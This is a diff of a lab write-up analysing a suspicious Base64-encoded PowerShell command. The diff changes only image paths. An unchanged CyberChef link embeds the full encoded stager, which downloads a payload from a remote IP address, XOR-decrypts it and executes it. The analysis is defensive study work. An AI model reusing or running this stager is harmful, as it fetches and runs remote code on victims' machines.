@@ -5,7 +5,7 @@ Last Updated: 27/02/2024 08:54
 <div align=center>
 
 **PowerShell Script**
-![9e1c85a69533dc4713b65d339e54db68.png](../../_resources/9e1c85a69533dc4713b65d339e54db68.png)
+![9e1c85a69533dc4713b65d339e54db68.png](/resources/9e1c85a69533dc4713b65d339e54db68.png)
 </div>
 You've come across a puzzling Base64 script, seemingly laced with malicious intent. Your mission, should you choose to accept it, is to dissect and analyze this script, unveiling its true nature and potential risks. Dive into the code and reveal its secrets to safeguard our digital realm. Good luck on this daring quest!
 
@@ -19,12 +19,12 @@ Credit: csnp.org
 After started the machine, let's open the text file to analyze the script.
 <div align=center>
 
-![e0dfe339aa844e5294708835cc927196.png](../../_resources/e0dfe339aa844e5294708835cc927196.png)
+![e0dfe339aa844e5294708835cc927196.png](/resources/e0dfe339aa844e5294708835cc927196.png)
 It is a command that will execute powershell.exe with the following paremeters
-![c87da0b112984a171525c32211f49244.png](../../_resources/c87da0b112984a171525c32211f49244.png)
-![405585e6fecce2c8a36c6de2e6d45249.png](../../_resources/405585e6fecce2c8a36c6de2e6d45249.png)
+![c87da0b112984a171525c32211f49244.png](/resources/c87da0b112984a171525c32211f49244.png)
+![405585e6fecce2c8a36c6de2e6d45249.png](/resources/405585e6fecce2c8a36c6de2e6d45249.png)
 With all of these, its already very suspicious so lets analyze the base64-encoded string
-![a69ac36c709fe62d061b175b15549021.png](../../_resources/a69ac36c709fe62d061b175b15549021.png)
+![a69ac36c709fe62d061b175b15549021.png](/resources/a69ac36c709fe62d061b175b15549021.png)
 I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Remove_null_bytes()&input=SkFCWEFFTUFQUUJPQUdVQWR3QXRBRThBWWdCcUFFVUFZd0JVQUNBQVV3QjVBRk1BVkFCbEFFMEFMZ0JPQUVVQVZBQXVBRmNBWlFCaUFFTUFiQUJwQUVVQVRnQjBBRHNBSkFCMUFEMEFKd0JOQUc4QWVnQnBBR3dBYkFCaEFDOEFOUUF1QURBQUlBQW9BRmNBYVFCdUFHUUFid0IzQUhNQUlBQk9BRlFBSUFBMkFDNEFNUUE3QUNBQVZ3QlBBRmNBTmdBMEFEc0FJQUJVQUhJQWFRQmtBR1VBYmdCMEFDOEFOd0F1QURBQU93QWdBSElBZGdBNkFERUFNUUF1QURBQUtRQWdBR3dBYVFCckFHVUFJQUJIQUdVQVl3QnJBRzhBSndBN0FDUUFWd0JEQUM0QVNBQmxBRUVBUkFCbEFGSUFVd0F1QUVFQVJBQmtBQ2dBSndCVkFITUFaUUJ5QUMwQVFRQm5BR1VBYmdCMEFDY0FMQUFrQUhVQUtRQTdBQ1FBVndCakFDNEFVQUJ5QUc4QWVBQlpBQ0FBUFFBZ0FGc0FVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFWQUF1QUZjQVJRQkNBRklBWlFCUkFGVUFSUUJ6QUhRQVhRQTZBRG9BUkFCRkFFWUFRUUIxQUV3QWRBQlhBR1VBWWdCUUFISUFid0JZQUhrQU93QWtBSGNBWXdBdUFGQUFVZ0JQQUhnQVdRQXVBRU1BY2dCRkFHUUFaUUJ1QUZRQWFRQmhBR3dBVXdBZ0FEMEFJQUJiQUZNQWVRQnpBRlFBWlFCdEFDNEFUZ0JGQUhRQUxnQkRBRklBWlFCa0FHVUFUZ0JVQUVrQVFRQnNBRU1BUVFCakFFZ0FSUUJkQURvQU9nQkVBR1VBUmdCQkFGVUFUQUJVQUU0QVpRQjBBRmNBVHdCeUFFc0FRd0J5QUdVQVpBQkZBRTRBVkFCcEFFRUFiQUJ6QURzQUpBQkxBRDBBSndCSkFFMEFMUUJUQUNZQVpnQkJBRGtBV0FCMUFIc0FXd0FwQUh3QWR3QmtBRmNBU2dCb0FFTUFLd0FoQUU0QWZnQjJBSEVBWHdBeEFESUFUQUIwQUhrQUp3QTdBQ1FBYVFBOUFEQUFPd0JiQUVNQVNBQmhBRklBV3dCZEFGMEFKQUJDQUQwQUtBQmJBR01BU0FCaEFGSUFXd0JkQUYwQUtBQWtBSGNBWXdBdUFFUUFUd0IzQUU0QVRBQlBBR0VBUkFCVEFIUUFjZ0JwQUU0QVp3QW9BQ0lBYUFCMEFIUUFjQUE2QUM4QUx3QTVBRGdBTGdBeEFEQUFNd0F1QURFQU1BQXpBQzRBTVFBM0FEQUFPZ0EzQURRQU5BQXpBQzhBYVFCdUFHUUFaUUI0QUM0QVlRQnpBSEFBSWdBcEFDa0FLUUI4QUNVQWV3QWtBRjhBTFFCQ0FGZ0Fid0JTQUNRQVN3QmJBQ1FBU1FBckFDc0FKUUFrQUdzQUxnQk1BRVVBYmdCSEFGUUFTQUJkQUgwQU93QkpBRVVBV0FBZ0FDZ0FKQUJDQUMwQWFnQlBBRWtBYmdBbkFDY0FLUUE9) to decode it with recipe From Base64 and Remove null bytes
 </div>
 
@@ -93,7 +93,7 @@ This script is invoking PowerShell with various parameters to run a PowerShell c
 And the base64-encoded command is designed to downloads an encrypted payload from a remote server, decrypts it using a simple XOR operation, and then executes the decrypted payload. 
 <div align=center>
 
-![f91d959c500b2fce9134f1d80a917d52.png](../../_resources/f91d959c500b2fce9134f1d80a917d52.png)
+![f91d959c500b2fce9134f1d80a917d52.png](/resources/f91d959c500b2fce9134f1d80a917d52.png)
 </div>
 
 * * *
